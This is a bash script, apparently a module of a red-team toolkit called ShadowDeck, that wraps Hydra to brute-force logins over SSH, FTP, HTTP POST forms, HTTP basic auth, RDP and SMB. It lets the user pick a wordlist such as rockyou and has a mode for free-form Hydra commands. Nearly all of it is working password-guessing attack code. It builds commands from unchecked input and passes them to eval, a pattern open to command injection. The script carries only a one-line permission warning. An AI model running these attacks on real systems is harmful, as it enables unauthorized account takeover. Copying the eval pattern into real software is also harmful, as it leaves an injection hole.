#!/usr/bin/env bash
# ShadowDeck v2 — Red Team | Brute Force Module
# modules/red/bruteforce.sh

RESET='\033[0m'
GREEN='\033[38;5;82m'
GREEN_DIM='\033[38;5;22m'
GREEN_HI='\033[38;5;118m'
RED='\033[38;5;196m'
AMBER='\033[38;5;214m'
CYAN='\033[38;5;51m'
BOLD='\033[1m'

LOGS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../logs" && pwd)"
mkdir -p "$LOGS_DIR"

dim_line()  { echo -e "${GREEN_DIM}$(printf '─%.0s' {1..70})${RESET}"; }
thick_line(){ echo -e "${GREEN}$(printf '═%.0s' {1..70})${RESET}"; }
info()  { echo -e "${CYAN}[*]${RESET} $1"; }
ok()    { echo -e "${GREEN}[+]${RESET} $1"; }
warn()  { echo -e "${AMBER}[!]${RESET} $1"; }
err()   { echo -e "${RED}[✗]${RESET} $1"; }
log()   { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [BRUTEFORCE] $1" >> "$LOGS_DIR/shadowdeck.log"; }
press_enter() { echo -e "\n${GREEN_DIM}  Press Enter to return...${RESET}"; read -r; }

# ── Wordlist Picker ───────────────────────────────────────────
pick_wordlist() {
    local WL_ROCK="/usr/share/wordlists/rockyou.txt"
    local WL_ROCK_GZ="/usr/share/wordlists/rockyou.txt.gz"
    local WL_COMMON="/usr/share/wordlists/dirb/common.txt"
    local WL_SEC="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"

    echo ""
    echo -e "  ${GREEN_HI}Select Wordlist:${RESET}"
    echo -e "  ${GREEN}[1]${RESET} rockyou.txt         ${GREEN_DIM}(classic, ~14M passwords)${RESET}"
    echo -e "  ${GREEN}[2]${RESET} 10k-most-common     ${GREEN_DIM}(seclists, fast)${RESET}"
    echo -e "  ${GREEN}[3]${RESET} Custom path         ${GREEN_DIM}(you specify)${RESET}"
    echo -ne "\n  ${GREEN_HI}wordlist${RESET}${GREEN} > ${RESET}"
    read -r wl_choice

    case "$wl_choice" in
        1)
            if [[ -f "$WL_ROCK" ]]; then
                WORDLIST="$WL_ROCK"
            elif [[ -f "$WL_ROCK_GZ" ]]; then
                warn "rockyou.txt is gzipped — extracting..."
                sudo gunzip "$WL_ROCK_GZ"
                WORDLIST="$WL_ROCK"
            else
                err "rockyou.txt not found."; WORDLIST=""; return 1
            fi
            ;;
        2)
            if [[ -f "$WL_SEC" ]]; then
                WORDLIST="$WL_SEC"
            else
                warn "seclists not found. Install: sudo apt install seclists"
                WORDLIST=""; return 1
            fi
            ;;
        3)
            echo -ne "  ${GREEN}Path${RESET}: "
            read -r WORDLIST
            if [[ ! -f "$WORDLIST" ]]; then
                err "File not found: $WORDLIST"; WORDLIST=""; return 1
            fi
            ;;
        *)
            err "Invalid choice"; WORDLIST=""; return 1 ;;
    esac
    ok "Wordlist: $WORDLIST"
    return 0
}

# ── Username Input ────────────────────────────────────────────
pick_username() {
    echo ""
    echo -e "  ${GREEN_HI}Username or user list?${RESET}"
    echo -e "  ${GREEN}[1]${RESET} Single username"
    echo -e "  ${GREEN}[2]${RESET} User list file"
    echo -ne "\n  ${GREEN_HI}user${RESET}${GREEN} > ${RESET}"
    read -r u_choice
    case "$u_choice" in
        1)
            echo -ne "  ${GREEN}Username${RESET}: "
            read -r USERNAME
            USER_FLAG="-l $USERNAME"
            ;;
        2)
            echo -ne "  ${GREEN}User list path${RESET}: "
            read -r USERLIST
            if [[ ! -f "$USERLIST" ]]; then
                err "File not found: $USERLIST"; return 1
            fi
            USER_FLAG="-L $USERLIST"
            ;;
        *)
            err "Invalid"; return 1 ;;
    esac
    return 0
}

# ── SSH ───────────────────────────────────────────────────────
run_ssh() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTEFORCE] SSH${RESET}"
    thick_line
    echo -ne "  ${GREEN}Target IP${RESET}: "; read -r TARGET
    echo -ne "  ${GREEN}Port${RESET} [22]: "; read -r PORT
    PORT="${PORT:-22}"
    pick_username || { press_enter; return; }
    pick_wordlist || { press_enter; return; }

    local cmd="hydra $USER_FLAG -P $WORDLIST ssh://$TARGET -s $PORT -t 4 -V"
    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    dim_line
    log "CMD: $cmd"
    eval "$cmd" 2>&1 | tee "$LOGS_DIR/brute_ssh_${TARGET}_$(date +%H%M%S).txt"
    press_enter
}

# ── FTP ───────────────────────────────────────────────────────
run_ftp() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTEFORCE] FTP${RESET}"
    thick_line
    echo -ne "  ${GREEN}Target IP${RESET}: "; read -r TARGET
    echo -ne "  ${GREEN}Port${RESET} [21]: "; read -r PORT
    PORT="${PORT:-21}"
    pick_username || { press_enter; return; }
    pick_wordlist || { press_enter; return; }

    local cmd="hydra $USER_FLAG -P $WORDLIST ftp://$TARGET -s $PORT -t 10 -V"
    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    dim_line
    log "CMD: $cmd"
    eval "$cmd" 2>&1 | tee "$LOGS_DIR/brute_ftp_${TARGET}_$(date +%H%M%S).txt"
    press_enter
}

# ── HTTP POST FORM ────────────────────────────────────────────
run_http_post() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTEFORCE] HTTP POST Form${RESET}"
    thick_line
    warn "You need: login URL, form fields, and failure string"
    echo ""
    echo -ne "  ${GREEN}Target IP/Domain${RESET}: "; read -r TARGET
    echo -ne "  ${GREEN}Login path${RESET} (e.g. /login): "; read -r LOGIN_PATH
    echo -ne "  ${GREEN}User field name${RESET} (e.g. username): "; read -r UFIELD
    echo -ne "  ${GREEN}Pass field name${RESET} (e.g. password): "; read -r PFIELD
    echo -ne "  ${GREEN}Failure string${RESET} (text shown on wrong pass, e.g. Invalid): "; read -r FAIL_STR
    echo -ne "  ${GREEN}Protocol${RESET} [http/https, default http]: "; read -r PROTO
    PROTO="${PROTO:-http}"
    pick_username || { press_enter; return; }
    pick_wordlist || { press_enter; return; }

    local form_str="${LOGIN_PATH}:${UFIELD}=^USER^&${PFIELD}=^PASS^:F=${FAIL_STR}"
    local cmd="hydra $USER_FLAG -P $WORDLIST $TARGET ${PROTO}-post-form \"$form_str\" -t 10 -V"
    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    dim_line
    log "CMD: $cmd"
    eval "$cmd" 2>&1 | tee "$LOGS_DIR/brute_http_${TARGET}_$(date +%H%M%S).txt"
    press_enter
}

# ── HTTP GET BASIC AUTH ───────────────────────────────────────
run_http_get() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTEFORCE] HTTP Basic Auth${RESET}"
    thick_line
    echo -ne "  ${GREEN}Target IP/Domain${RESET}: "; read -r TARGET
    echo -ne "  ${GREEN}Path${RESET} (e.g. /admin): "; read -r PATH_
    echo -ne "  ${GREEN}Protocol${RESET} [http/https, default http]: "; read -r PROTO
    PROTO="${PROTO:-http}"
    pick_username || { press_enter; return; }
    pick_wordlist || { press_enter; return; }

    local cmd="hydra $USER_FLAG -P $WORDLIST ${PROTO}://$TARGET http-get $PATH_ -t 10 -V"
    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    dim_line
    log "CMD: $cmd"
    eval "$cmd" 2>&1 | tee "$LOGS_DIR/brute_httpget_${TARGET}_$(date +%H%M%S).txt"
    press_enter
}

# ── RDP ───────────────────────────────────────────────────────
run_rdp() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTEFORCE] RDP${RESET}"
    thick_line
    echo -ne "  ${GREEN}Target IP${RESET}: "; read -r TARGET
    pick_username || { press_enter; return; }
    pick_wordlist || { press_enter; return; }

    local cmd="hydra $USER_FLAG -P $WORDLIST rdp://$TARGET -t 4 -V"
    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    dim_line
    log "CMD: $cmd"
    eval "$cmd" 2>&1 | tee "$LOGS_DIR/brute_rdp_${TARGET}_$(date +%H%M%S).txt"
    press_enter
}

# ── SMB ───────────────────────────────────────────────────────
run_smb() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTEFORCE] SMB${RESET}"
    thick_line
    echo -ne "  ${GREEN}Target IP${RESET}: "; read -r TARGET
    pick_username || { press_enter; return; }
    pick_wordlist || { press_enter; return; }

    local cmd="hydra $USER_FLAG -P $WORDLIST smb://$TARGET -t 4 -V"
    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    dim_line
    log "CMD: $cmd"
    eval "$cmd" 2>&1 | tee "$LOGS_DIR/brute_smb_${TARGET}_$(date +%H%M%S).txt"
    press_enter
}

# ── CUSTOM ────────────────────────────────────────────────────
run_custom() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTEFORCE] Custom Hydra Command${RESET}"
    thick_line
    echo -ne "  ${GREEN}Full hydra command${RESET}: hydra "
    read -r custom_cmd
    local cmd="hydra $custom_cmd"
    echo ""
    info "Running: ${CYAN}$cmd${RESET}"
    dim_line
    log "CMD: $cmd"
    eval "$cmd"
    press_enter
}

# ── MAIN MENU ─────────────────────────────────────────────────
while true; do
    clear; thick_line
    echo -e "  ${RED}${BOLD}[ RED TEAM → BRUTE FORCE ]${RESET}  ${GREEN_DIM}powered by Hydra${RESET}"
    thick_line
    echo -e "  ${GREEN}[1]${RESET} SSH                  ${GREEN_DIM}— port 22 (default)${RESET}"
    echo -e "  ${GREEN}[2]${RESET} FTP                  ${GREEN_DIM}— port 21 (default)${RESET}"
    echo -e "  ${GREEN}[3]${RESET} HTTP POST Form        ${GREEN_DIM}— web login forms${RESET}"
    echo -e "  ${GREEN}[4]${RESET} HTTP Basic Auth       ${GREEN_DIM}— GET basic auth${RESET}"
    echo -e "  ${GREEN}[5]${RESET} RDP                  ${GREEN_DIM}— Windows remote desktop${RESET}"
    echo -e "  ${GREEN}[6]${RESET} SMB                  ${GREEN_DIM}— Windows file share${RESET}"
    echo -e "  ${GREEN}[7]${RESET} Custom Command        ${GREEN_DIM}— full manual hydra flags${RESET}"
    dim_line
    echo -e "  ${GREEN_DIM}[0] Back to Dashboard${RESET}"
    dim_line
    echo ""
    warn "Only use against targets you own or have permission to test."
    dim_line
    echo -ne "\n  ${GREEN_HI}shadow@bruteforce${RESET}${GREEN} > ${RESET}"
    read -r choice

    case "$choice" in
        1) run_ssh ;;
        2) run_ftp ;;
        3) run_http_post ;;
        4) run_http_get ;;
        5) run_rdp ;;
        6) run_smb ;;
        7) run_custom ;;
        0) exit 0 ;;
        *) warn "Invalid option"; sleep 0.8 ;;
    esac
done
